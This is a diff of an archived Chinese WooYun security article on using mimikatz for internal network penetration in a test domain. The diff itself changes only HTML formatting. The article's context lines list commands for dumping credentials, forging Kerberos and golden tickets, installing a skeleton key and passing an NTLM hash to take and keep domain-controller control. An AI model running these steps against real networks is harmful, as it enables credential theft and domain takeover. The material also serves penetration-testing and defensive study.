@@ -3,30 +3,30 @@
 			<head>
 			     <title>内网渗透中的mimikatz - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/7547">http://drops.wooyun.org/tips/7547</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>上篇测试了中间人攻击利用框架bettercap，这次挑选一款更具代表性的工具——mimikatz</p>
 
-<p><img src="http://static.wooyun.org//drops/20150730/2015073009320530508.net/20150730112945544" alt="这里写图片描述" /></p>
+<p><img src="http://static.wooyun.org//drops/20150730/2015073009320530508.net/20150730112945544" alt="这里写图片描述"></p>
 
 <!--more-->
 
 <h1>0x01 简介</h1>
 
-<hr />
+<hr>
 
 <p>mimikatz，很多人称之为密码抓取神器，但在内网渗透中，远不止这么简单</p>
 
 <h1>0x02 测试环境</h1>
 
-<hr />
+<hr>
 
 <p>网络资源管理模式：</p>
 
@@ -42,13 +42,13 @@
 
 <h1>0x03 测试目标</h1>
 
-<hr />
+<hr>
 
 <p>1、获得域控权限 2、导出所有用户口令 3、维持域控权限</p>
 
 <h1>0x04 测试过程</h1>
 
-<hr />
+<hr>
 
 <h3>1、获取本机信息</h3>
 
@@ -58,7 +58,7 @@
 sekurlsa::logonpasswords
 </code></pre>
 
-<p>获取本机用户名、口令、sid、LM hash、NTLM hash 如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320681423.net/20150730113118899" alt="这里写图片描述" /></p>
+<p>获取本机用户名、口令、sid、LM hash、NTLM hash 如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320681423.net/20150730113118899" alt="这里写图片描述"></p>
 
 <h3>2、攻击域控，获得权限</h3>
 
@@ -69,7 +69,7 @@ sekurlsa::logonpasswords
 
 <p>生成伪造缓存test.ccache:</p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320667563.net/20150730113137651" alt="这里写图片描述" /> 导入伪造缓存: <strong>mimikatz：</strong></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320667563.net/20150730113137651" alt="这里写图片描述"> 导入伪造缓存: <strong>mimikatz：</strong></p>
 
 <pre><code>kerberos::ptc test.ccache
 </code></pre>
@@ -80,7 +80,7 @@ sekurlsa::logonpasswords
 dir \\A-635ECAEE64804.TEST.LOCAL\c$
 </code></pre>
 
-<p>获得域控权限，如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320628194.net/20150730113250581" alt="这里写图片描述" /></p>
+<p>获得域控权限，如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320628194.net/20150730113250581" alt="这里写图片描述"></p>
 
 <h3>3、导出域控信息</h3>
 
@@ -119,14 +119,14 @@ misc::skeleton
 <pre><code>net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320772639.net/20150730113155508" alt="这里写图片描述" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320772639.net/20150730113155508" alt="这里写图片描述"></p>
 
 <p>（2）golden ticket <strong>mimikatz：</strong></p>
 
 <pre><code>lsadump::lsa /patch
 </code></pre>
 
-<p>获取krbtgt的ntlmhash，如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320826819.net/20150730113326196" alt="这里写图片描述" /></p>
+<p>获取krbtgt的ntlmhash，如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320826819.net/20150730113326196" alt="这里写图片描述"></p>
 
 <p>生成万能票据： <strong>mimikatz：</strong></p>
 
@@ -144,7 +144,7 @@ misc::skeleton
 dir \\A-635ECAEE64804.TEST.LOCAL\c$
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320892986.net/20150730113224602" alt="这里写图片描述" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320892986.net/20150730113224602" alt="这里写图片描述"></p>
 
 <p><strong><em>Tips:</em></strong></p>
 
@@ -160,7 +160,7 @@ NTLM hash of krbtgt account is never changed automatically.
 <pre><code>sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320828148.net/20150730113349050" alt="这里写图片描述" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009320828148.net/20150730113349050" alt="这里写图片描述"></p>
 
 <h3>5、补充</h3>
 
@@ -169,15 +169,15 @@ NTLM hash of krbtgt account is never changed automatically.
 <pre><code>minesweeper::infos
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009321519422.net/20150730113245101" alt="这里写图片描述" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20150730/2015073009321519422.net/20150730113245101" alt="这里写图片描述"></p>
 
 <h1>0x05 小结</h1>
 
-<hr />
+<hr>
 
 <p>本文重点在于介绍mimikatz在内网渗透中的常用方法，其它细节做了适当省略，可在后续详细介绍细节。</p>
 
-<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明，谢谢</strong> 神器在手，会用才行；） 水平有限，欢迎补充。</p>      </p>
+<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明，谢谢</strong> 神器在手，会用才行；） 水平有限，欢迎补充。</p>      <p></p>
     
 			</body>
 		</html>
